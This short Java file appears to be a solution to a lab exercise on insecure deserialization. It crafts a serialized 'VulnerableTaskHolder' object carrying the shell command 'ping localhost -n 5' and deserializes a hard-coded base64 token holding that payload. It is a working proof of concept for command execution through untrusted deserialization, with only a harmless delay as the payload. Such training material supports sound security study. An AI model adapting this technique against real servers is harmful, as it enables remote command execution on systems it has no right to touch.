package com.example.demo.deseralisation;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Testexploi {

	public static void main(String[] args) throws IOException, ClassNotFoundException {
		// TODO Auto-generated method stub

		VulnerableTaskHolder go = new VulnerableTaskHolder("wait", "ping localhost -n 5");

		
	    String ss = SerializationHelper.toString(go);
		System.out.println(	ss);
		
		
		String token="rO0ABXNyADRjb20uZXhhbXBsZS5kZW1vLmRlc2VyYWxpc2F0aW9uLlZ1bG5lcmFibGVUYXNrSG9sZGVyE0yUelCt4K0CAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAflCxIWNiAv1qzUeHQAE3BpbmcgbG9jYWxob3N0IC1uIDV0AAR3YWl0";
				
		String  b64token = token.replace('-', '+').replace('_', '/');
		 try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) {
	           
	            Object o = ois.readObject();
		 }
	}

}
